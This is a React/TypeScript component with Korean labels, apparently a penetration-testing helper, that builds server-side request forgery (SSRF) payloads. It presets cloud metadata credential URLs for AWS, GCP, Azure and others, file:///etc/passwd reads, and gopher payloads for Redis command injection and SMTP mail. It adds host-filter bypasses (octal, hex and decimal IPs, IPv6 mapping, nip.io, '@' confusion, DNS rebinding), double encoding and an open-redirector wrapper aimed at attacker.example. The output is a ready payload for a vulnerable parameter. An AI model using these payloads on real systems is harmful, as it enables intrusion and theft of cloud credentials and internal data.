import { useState } from 'react'
import { DISCLAIMER, Note, Pick, TextInput, Readout, urlEncodeAll } from './shared'

/* ── 노리는 대상 프리셋 ────────────────────────────────────────── */
const TARGETS = [
  { id: 'aws-imds', label: 'AWS EC2 메타데이터 (IMDSv1)', url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', host: '169.254.169.254' },
  { id: 'aws-imds-token', label: 'AWS IMDSv2 토큰 요청 (PUT 필요)', url: 'http://169.254.169.254/latest/api/token', host: '169.254.169.254' },
  { id: 'gcp', label: 'GCP 메타데이터 (Metadata-Flavor 헤더 필요)', url: 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token', host: '169.254.169.254' },
  { id: 'azure', label: 'Azure IMDS', url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', host: '169.254.169.254' },
  { id: 'alibaba', label: 'Alibaba Cloud 메타데이터', url: 'http://100.100.100.200/latest/meta-data/', host: '100.100.100.200' },
  { id: 'do', label: 'DigitalOcean 메타데이터', url: 'http://169.254.169.254/metadata/v1.json', host: '169.254.169.254' },
  { id: 'localhost', label: '로컬호스트 서비스 (포트 지정)', url: 'http://127.0.0.1:PORT/', host: '127.0.0.1' },
  { id: 'internal', label: '내부 대역 호스트', url: 'http://INTERNAL-HOST/', host: 'INTERNAL-HOST' },
  { id: 'file', label: '로컬 파일 읽기 (file://)', url: 'file:///etc/passwd', host: '' },
  { id: 'gopher-redis', label: 'Gopher → Redis 명령 주입', url: "gopher://127.0.0.1:6379/_%0D%0ASET%20k%20v%0D%0A", host: '127.0.0.1' },
  { id: 'gopher-smtp', label: 'Gopher → SMTP 메일 발송', url: 'gopher://127.0.0.1:25/_HELO%20x%0D%0AMAIL%20FROM:...', host: '127.0.0.1' },
  { id: 'dict', label: 'dict:// 포트 배너 그랩', url: 'dict://127.0.0.1:6379/info', host: '127.0.0.1' },
]

/* ── 우회 기법: host 부분을 변형 ───────────────────────────────── */
type Bypass = { id: string; label: string; transform: (host: string) => string; hint?: string }

function ipParts(host: string): number[] | null {
  const m = host.match(/^(\d+)\.(\d+)\.(\d+)\.(\d+)$/)
  return m ? m.slice(1).map(Number) : null
}

const BYPASSES: Bypass[] = [
  { id: 'none', label: '없음 (그대로)', transform: h => h },
  {
    id: 'decimal', label: '10진수 정수 IP', hint: '127.0.0.1 → 2130706433',
    transform: h => { const p = ipParts(h); return p ? String((p[0] << 24 >>> 0) + (p[1] << 16) + (p[2] << 8) + p[3]) : h },
  },
  {
    id: 'octal', label: '8진수 IP', hint: '127.0.0.1 → 0177.0.0.01',
    transform: h => { const p = ipParts(h); return p ? p.map(n => '0' + n.toString(8)).join('.') : h },
  },
  {
    id: 'hex', label: '16진수 IP', hint: '127.0.0.1 → 0x7f000001',
    transform: h => { const p = ipParts(h); return p ? '0x' + p.map(n => n.toString(16).padStart(2, '0')).join('') : h },
  },
  {
    id: 'mixed', label: '혼합 표기 (dword 일부)', hint: '127.1 / 127.0.1',
    transform: h => { const p = ipParts(h); return p ? `${p[0]}.${(p[1] << 16) + (p[2] << 8) + p[3]}` : h },
  },
  { id: 'ipv6-mapped', label: 'IPv4-mapped IPv6', transform: h => `[::ffff:${h}]`, hint: '[::ffff:127.0.0.1]' },
  { id: 'ipv6-loop', label: 'IPv6 루프백', transform: () => '[::1]' },
  { id: 'zero', label: '0.0.0.0 / 0 (로컬 바인딩)', transform: () => '0.0.0.0' },
  { id: 'localhost-alt', label: 'localhost 변형', transform: () => 'localhost', hint: 'localhost. / LOCALHOST / 127.0.0.1.nip.io' },
  { id: 'nip', label: 'nip.io 와일드카드 DNS', transform: h => `${h.replace(/\./g, '-')}.nip.io`, hint: '외부에서 내부 IP 로 해석되는 공개 DNS' },
  {
    id: 'at', label: '@ 로 인증정보 위장', transform: h => `EXPECTED-HOST@${h}`,
    hint: 'http://trusted.example@169.254.169.254/ — 파서가 host 를 뒤쪽으로 읽음',
  },
  {
    id: 'fragment', label: '# 프래그먼트로 자르기', transform: h => `${h}#EXPECTED-HOST`,
    hint: '허용목록 검사가 앞부분만 볼 때',
  },
  {
    id: 'rebind', label: 'DNS 리바인딩 호스트', transform: () => 'ATTACKER-REBIND-DOMAIN',
    hint: '검사 시엔 외부 IP, 요청 시엔 내부 IP 로 응답하는 도메인 (TTL 0)',
  },
]

const ENCODINGS = [
  { id: 'raw', label: '원문' },
  { id: 'url', label: 'URL 인코딩 (host 뒤 경로)' },
  { id: 'url-full', label: '전체 URL 인코딩' },
  { id: 'url-double', label: '이중 URL 인코딩' },
]

export function SsrfPayloadBuilder() {
  const [targetId, setTargetId] = useState('aws-imds')
  const [bypassId, setBypassId] = useState('none')
  const [encId, setEncId] = useState('raw')
  const [port, setPort] = useState('8080')
  const [internalHost, setInternalHost] = useState('')
  const [redirector, setRedirector] = useState('')

  const target = TARGETS.find(t => t.id === targetId)!
  const bypass = BYPASSES.find(b => b.id === bypassId)!

  let url = target.url
  if (targetId === 'localhost') url = url.replace('PORT', port || '8080')
  if (targetId === 'internal') url = url.replace('INTERNAL-HOST', internalHost || 'INTERNAL-HOST')

  // host 치환 (스킴이 host 를 갖는 경우에만)
  let mutated = url
  if (target.host && bypassId !== 'none') {
    mutated = url.replace(target.host, bypass.transform(target.host))
  }

  let encoded = mutated
  if (encId === 'url') {
    const m = mutated.match(/^([a-z]+:\/\/[^/]+)(\/.*)?$/i)
    encoded = m ? m[1] + (m[2] ? urlEncodeAll(m[2]) : '') : mutated
  } else if (encId === 'url-full') encoded = urlEncodeAll(mutated)
  else if (encId === 'url-double') encoded = urlEncodeAll(urlEncodeAll(mutated))

  const viaRedirect = redirector
    ? `${redirector.replace(/\/$/, '')}/r?to=${encodeURIComponent(mutated)}`
    : ''

  const headerNotes: string[] = []
  if (targetId === 'gcp') headerNotes.push('GCP 는 요청에 `Metadata-Flavor: Google` 헤더가 필요합니다 — SSRF 가 헤더를 제어할 수 있어야 함.')
  if (targetId === 'aws-imds-token') headerNotes.push('IMDSv2: 먼저 PUT /latest/api/token (X-aws-ec2-metadata-token-ttl-seconds) 로 토큰을 받고, 이후 요청에 X-aws-ec2-metadata-token 헤더 필요.')
  if (target.url.startsWith('gopher')) headerNotes.push('gopher 페이로드의 CRLF 는 %0D%0A 로 인코딩되어 있어야 하며, 대상 서비스가 raw TCP 로 파싱합니다.')

  return <div className="payload-builder">
    <Note>{DISCLAIMER}</Note>

    <Pick label="노리는 대상" value={targetId} onChange={setTargetId} options={TARGETS.map(t => ({ id: t.id, label: t.label }))}/>
    {targetId === 'localhost' && <TextInput label="포트" value={port} onChange={setPort} placeholder="8080"/>}
    {targetId === 'internal' && <TextInput label="내부 호스트/IP" value={internalHost} onChange={setInternalHost} placeholder="10.0.0.5 또는 admin.internal"/>}

    <Pick label="필터 우회 (호스트 표기 변형)" value={bypassId} onChange={setBypassId} options={BYPASSES.map(b => ({ id: b.id, label: b.label }))}/>
    {bypass.hint && <p className="payload-builder-hint">{bypass.hint}</p>}
    {!target.host && bypassId !== 'none' && <p className="payload-builder-hint">이 스킴은 호스트가 없어 우회 변형이 적용되지 않습니다.</p>}

    <Pick label="인코딩" value={encId} onChange={setEncId} options={ENCODINGS.map(e => ({ id: e.id, label: e.label }))}/>

    <TextInput label="오픈 리다이렉터 (선택) — 허용목록 우회용" value={redirector} onChange={setRedirector} placeholder="//attacker.example"/>

    {headerNotes.map((t, i) => <p className="payload-builder-hint" key={i}>{t}</p>)}

    <div className="payload-readout-group">
      <Readout title="페이로드 URL (취약 파라미터에 대입)" value={encoded} wrap="anywhere"/>
      {viaRedirect && <Readout title="오픈 리다이렉터 경유" value={viaRedirect} wrap="anywhere"/>}
    </div>
  </div>
}
